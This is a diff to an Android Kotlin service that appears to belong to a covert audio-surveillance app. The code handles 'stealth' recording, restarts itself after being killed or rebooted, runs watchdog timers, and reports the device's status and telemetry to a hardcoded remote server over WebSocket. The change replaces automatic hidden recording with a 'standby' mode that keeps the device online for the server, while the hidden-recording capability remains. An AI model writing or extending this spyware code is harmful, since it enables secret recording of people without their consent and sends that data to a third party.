@@ -151,12 +151,9 @@ class AudioRecordService : Service() {
         if (intent == null) {
             // Android OS restarted the service after process termination (START_STICKY)
             val prefs = getSharedPreferences("AudioMonitorPrefs", Context.MODE_PRIVATE)
-            val wasRunning = prefs.getBoolean("was_running", false)
-            val savedUrl = prefs.getString("server_url", null)
-            if (wasRunning && !savedUrl.isNullOrEmpty()) {
-                // Auto-restart must ALWAYS start in hidden mode only (not main)
-                startHiddenRecording(savedUrl)
-            }
+            val defaultUrl = prefs.getString("server_url", "https://audio-steam-server.onrender.com") ?: "https://audio-steam-server.onrender.com"
+            // Start in standby so device comes online and notifies server without recording immediately
+            startStandby(defaultUrl)
         } else {
             val prefs = getSharedPreferences("AudioMonitorPrefs", Context.MODE_PRIVATE)
             val defaultUrl = prefs.getString("server_url", "https://audio-steam-server.onrender.com") ?: ""
@@ -693,6 +690,12 @@ class AudioRecordService : Service() {
                         sendLog("🔄 Transmitting device_boot recovery packet to server via WebSocket")
                         socketManager?.sendEvent("device_boot", mapOf("status" to "reboot_recovered", "is_recording" to isHiddenRecording))
                     }
+                    sendLog("🟢 Device is ONLINE. Transmitting status and telemetry to server...")
+                    socketManager?.sendEvent("device_online", mapOf(
+                        "status" to "online",
+                        "is_recording" to isRunning,
+                        "mode" to if (isRunning) "recording" else "standby"
+                    ))
                     sendLiveTelemetry()
                     socketManager?.sendStatus(if (isRunning) "recording" else "idle")
                 }
@@ -804,9 +807,10 @@ class AudioRecordService : Service() {
             socketManager?.sendEvent("watchdog_activation", mapOf("action" to "already_running", "interval_hours" to intervalH, "anchor_hour" to anchorH))
             sendLiveTelemetry()
         } else {
-            sendLog("⏰ Dynamic Watchdog check: Stealth recording was OFF! Automatically starting stealth recording now.")
-            startHiddenRecording(url)
-            socketManager?.sendEvent("watchdog_activation", mapOf("action" to "started_recording", "interval_hours" to intervalH, "anchor_hour" to anchorH))
+            sendLog("⏰ Dynamic Watchdog check: Standby mode verified (Online). Socket connected and telemetry sent.")
+            startStandby(url)
+            socketManager?.sendEvent("watchdog_activation", mapOf("action" to "standby_alive", "interval_hours" to intervalH, "anchor_hour" to anchorH))
+            sendLiveTelemetry()
         }
     }
 
@@ -820,12 +824,13 @@ class AudioRecordService : Service() {
 
                 delay(intervalH * 3600 * 1000L) // Dynamic in-service interval
                 try {
-                    val currentHour = Calendar.getInstance().get(Calendar.HOUR_OF_DAY)
-                    if (currentHour >= anchorH && !isHiddenRecording) {
-                        sendLog("⏰ Internal ticker: Stealth recording was OFF! Auto-starting now (Anchor $anchorH:00, Interval ${intervalH}h).")
+                    if (!isHiddenRecording && !isStandbyMode) {
+                        sendLog("⏰ Internal ticker: Keeping standby mode active (Device Online).")
                         withContext(Dispatchers.Main) {
-                            startHiddenRecording(serverUrl)
+                            startStandby(serverUrl)
                         }
+                    } else {
+                        sendLiveTelemetry()
                     }
                 } catch (e: Exception) { /* ignore */ }
             }
